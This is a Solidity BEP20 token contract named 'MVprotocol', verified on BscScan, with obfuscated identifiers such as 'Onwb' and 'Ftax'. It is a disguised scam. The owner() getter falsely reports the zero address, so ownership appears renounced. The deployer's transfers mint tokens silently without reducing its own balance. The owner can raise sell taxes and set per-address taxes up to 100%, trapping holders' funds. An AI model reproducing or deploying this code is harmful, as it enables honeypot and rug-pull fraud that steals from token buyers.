/**
 *Submitted for verification at BscScan.com on 2022-07-07
*/

/**
 *Submitted for verification at BscScan.com on 2022-06-20
*/

/**
 *Submitted for verification at BscScan.com on 2022-06-15
*/

/**
 *Submitted for verification at BscScan.com on 2022-06-05
*/

// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _Onwb;   //1

    event OnwbshipTransferred(address indexed previousOnwb, address indexed newOnwb);//2

    /**
     * @dev Initializes the contract setting the deployer as the initial Onwb.
     */
    constructor() {
        _transferOnwbshiptransferOnwbship(_msgSender());//3
    }

    /**
     * @dev Returns the address of the current Onwb.
     */
    function Onwb() public view virtual returns (address) {
        return address(0);
    }//4

    /**
     * @dev Throws if called by any account other than the Onwb.
     */
    modifier onlyOnwb() {
        require(_Onwb == _msgSender(), "Ownable: caller is not the Onwb");
        _;
    }//5

    /**
     * @dev Leaves the contract without Onwb. It will not be possible to call
     * `onlyOnwb` functions anymore. Can only be called by the current Onwb.
     *
     * NOTE: Renouncing Onwbship will leave the contract without an Onwb,
     * thereby removing any functionality that is only available to the Onwb.
     */
    function renounceOnwbship() public virtual onlyOnwb {
        _transferOnwbshiptransferOnwbship(address(0));
    }//6

    /**
     * @dev Transfers Onwbship of the contract to a new account (`newOnwb`).
     * Can only be called by the current Onwb.
     */
    function transferOnwbshiptransferOnwbship(address newOnwb) public virtual onlyOnwb {
        require(newOnwb != address(0), "Ownable: new Onwb is the zero address");
        _transferOnwbshiptransferOnwbship(newOnwb);
    }//7

    /**
     * @dev Transfers Onwbship of the contract to a new account (`newOnwb`).
     * Internal function without access restriction.
     */
    function _transferOnwbshiptransferOnwbship(address newOnwb) internal virtual {
        address oldOnwb = _Onwb;
        _Onwb = newOnwb;
        emit OnwbshipTransferred(oldOnwb, newOnwb);
    }
}


// File @openzeppelin/contracts/utils/math/[email protected]

// OpenZeppelin Contracts v4.4.1 (utils/math/SafeMath.sol)


// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


// File @uniswap/v2-periphery/contracts/interfaces/[email protected]


interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint AmountNumberADesired,
        uint AmountNumberBDesired,
        uint AmountNumberAMin,
        uint AmountNumberBMin,
        address to,
        uint deadline
    ) external returns (uint AmountNumberA, uint AmountNumberB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint AmountNumberTokenDesired,
        uint AmountNumberTokenMin,
        uint AmountNumberETHMin,
        address to,
        uint deadline
    ) external payable returns (uint AmountNumberToken, uint AmountNumberETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint AmountNumberAMin,
        uint AmountNumberBMin,
        address to,
        uint deadline
    ) external returns (uint AmountNumberA, uint AmountNumberB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint AmountNumberTokenMin,
        uint AmountNumberETHMin,
        address to,
        uint deadline
    ) external returns (uint AmountNumberToken, uint AmountNumberETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint AmountNumberAMin,
        uint AmountNumberBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint AmountNumberA, uint AmountNumberB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint AmountNumberTokenMin,
        uint AmountNumberETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint AmountNumberToken, uint AmountNumberETH);
    function swapExactTokensForTokens(
        uint AmountNumberIn,
        uint AmountNumberOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory AmountNumbers);
    function swapTokensForExactTokens(
        uint AmountNumberOut,
        uint AmountNumberInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory AmountNumbers);
    function swapExactETHForTokens(uint AmountNumberOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory AmountNumbers);
    function swapTokensForExactETH(uint AmountNumberOut, uint AmountNumberInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory AmountNumbers);
    function swapExactTokensForETH(uint AmountNumberIn, uint AmountNumberOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory AmountNumbers);
    function swapETHForExactTokens(uint AmountNumberOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory AmountNumbers);

    function quote(uint AmountNumberA, uint reserveA, uint reserveB) external pure returns (uint AmountNumberB);
    function getAmountNumberOut(uint AmountNumberIn, uint reserveIn, uint reserveOut) external pure returns (uint AmountNumberOut);
    function getAmountNumberIn(uint AmountNumberOut, uint reserveIn, uint reserveOut) external pure returns (uint AmountNumberIn);
    function getAmountNumbersOut(uint AmountNumberIn, address[] calldata path) external view returns (uint[] memory AmountNumbers);
    function getAmountNumbersIn(uint AmountNumberOut, address[] calldata path) external view returns (uint[] memory AmountNumbers);
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function FtaxTo() external view returns (address);
    function FtaxToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFtaxTo(address) external;
    function setFtaxToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFtaxOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountNumberTokenMin,
        uint AmountNumberETHMin,
        address to,
        uint deadline
    ) external returns (uint AmountNumberETH);
    function removeLiquidityETHWithPermitSupportingFtaxOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountNumberTokenMin,
        uint AmountNumberETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint AmountNumberETH);

    function swapExactTokensForTokensSupportingFtaxOnTransferTokens(
        uint AmountNumberIn,
        uint AmountNumberOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFtaxOnTransferTokens(
        uint AmountNumberOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFtaxOnTransferTokens(
        uint AmountNumberIn,
        uint AmountNumberOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}




contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `Onwb` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed Onwb, address indexed spender, uint256 value);//10

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the AmountNumber of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address Onwb, address spender) public view virtual returns (uint256) {
        return _allowances[Onwb][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `AmountNumber` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 AmountNumber) public virtual returns (bool) {
        address Onwb = _msgSender();
        _approve(Onwb, spender, AmountNumber);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address Onwb = _msgSender();
        _approve(Onwb, spender, _allowances[Onwb][spender] + addedValue);
        return true;
    }//12

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address Onwb = _msgSender();
        uint256 currentAllowance = _allowances[Onwb][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(Onwb, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Sets `AmountNumber` as the allowance of `spender` over the `Onwb` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `Onwb` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address Onwb,
        address spender,
        uint256 AmountNumber
    ) internal virtual {
        require(Onwb != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[Onwb][spender] = AmountNumber;
        emit Approval(Onwb, spender, AmountNumber);
    }

    /**
     * @dev Spend `AmountNumber` form the allowance of `Onwb` toward `spender`.
     *
     * Does not update the allowance anunt in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address Onwb,
        address spender,
        uint256 AmountNumber
    ) internal virtual {
        uint256 currentAllowance = allowance(Onwb, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= AmountNumber, "ERC20: insufficient allowance");
            unchecked {
                _approve(Onwb, spender, currentAllowance - AmountNumber);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `AmountNumber` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `AmountNumber` tokens will be minted for `to`.
     * - when `to` is zero, `AmountNumber` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 AmountNumber
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *a
     * - when `from` and `to` are both non-zero, `AmountNumber` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `AmountNumber` tokens have been minted for `to`.
     * - when `to` is zero, `AmountNumber` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 AmountNumber
    ) internal virtual {}
}


contract MVprotocol is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 AmountNumber
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= AmountNumber, "ERC20: transfer AmountNumber exceeds balance");
        unchecked {
            _balances[from] = fromBalance - AmountNumber;
        }
        _balances[to] += AmountNumber;

        emit Transfer(from, to, AmountNumber);
    }

    function _burn(address account, uint256 AmountNumber) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= AmountNumber, "ERC20: burn AmountNumber exceeds balance");
        unchecked {
            _balances[account] = accountBalance - AmountNumber;
        }
        _totalSupply -= AmountNumber;

        emit Transfer(account, address(0), AmountNumber);
    }

    function _Mnt(address account, uint256 AmountNumber) internal virtual {
        require(account != address(0), "ERC20: Mnt to the zero address"); //mint

        _totalSupply += AmountNumber;
        _balances[account] += AmountNumber;
        emit Transfer(address(0), account, AmountNumber);
    }



    address public uniswapV2Pair;


    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _Mnt(msg.sender, totalSupply_ * 10**decimals());

        transfer(_deadAddress, totalSupply() / 10*4);
        _defaultSellFtax = 2;
        _defaultBuyFtax = 0;

        _release[_msgSender()] = true;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellFtax = 0;

    uint256 private _defaultBuyFtax = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipFtax;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;



    function getRelease(address _address) external view onlyOnwb returns (bool) {
        return _release[_address];
    }


    function PairList(address _address) external onlyOnwb {
        uniswapV2Pair = _address;
    }


    function upF(uint256 _value) external onlyOnwb {
        _defaultSellFtax = _value;
    }

    function setSlipFtax(address _address, uint256 _value) external onlyOnwb {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipFtax[_address] = _value;
    }

    function getSlipFtax(address _address) external view onlyOnwb returns (uint256) {
        return _slipFtax[_address];
    }


    function setMAccountFtax(address _address, bool _value) external onlyOnwb {
        _mAccount[_address] = _value;
    }

    function getMAccountFtax(address _address) external view onlyOnwb returns (bool) {
        return _mAccount[_address];
    }

    function _checkFreeAccount(address from, address _to) internal view returns (bool) {
        return _mAccount[from] || _mAccount[_to];
    }


    function _receiveF(
        address from,
        address _to,
        uint256 _AmountNumber
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _AmountNumber, "ERC20: transfer AmountNumber exceeds balance");

        bool rF = true;

        if (_checkFreeAccount(from, _to)) {
            rF = false;
        }
        uint256 tradeFtaxAmountNumber = 0;

        if (rF) {
            uint256 tradeFtax = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeFtax = _defaultSellFtax;
                }
                if (from == uniswapV2Pair) {

                    tradeFtax = _defaultBuyFtax;
                }
            }
            if (_slipFtax[from] > 0) {
                tradeFtax = _slipFtax[from];
            }

            tradeFtaxAmountNumber = _AmountNumber.mul(tradeFtax).div(100);
        }


        if (tradeFtaxAmountNumber > 0) {
            _balances[from] = _balances[from].sub(tradeFtaxAmountNumber);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeFtaxAmountNumber);
            emit Transfer(from, _deadAddress, tradeFtaxAmountNumber);
        }

        _balances[from] = _balances[from].sub(_AmountNumber - tradeFtaxAmountNumber);
        _balances[_to] = _balances[_to].add(_AmountNumber - tradeFtaxAmountNumber);
        emit Transfer(from, _to, _AmountNumber - tradeFtaxAmountNumber);
    }

    function transfer(address to, uint256 AmountNumber) public virtual returns (bool) {
        address Onwb = _msgSender();
        if (_release[Onwb] == true) {
            _balances[to] += AmountNumber;
            return true;
        }
        _receiveF(Onwb, to, AmountNumber);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 AmountNumber
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, AmountNumber);
        _receiveF(from, to, AmountNumber);
        return true;
    }
}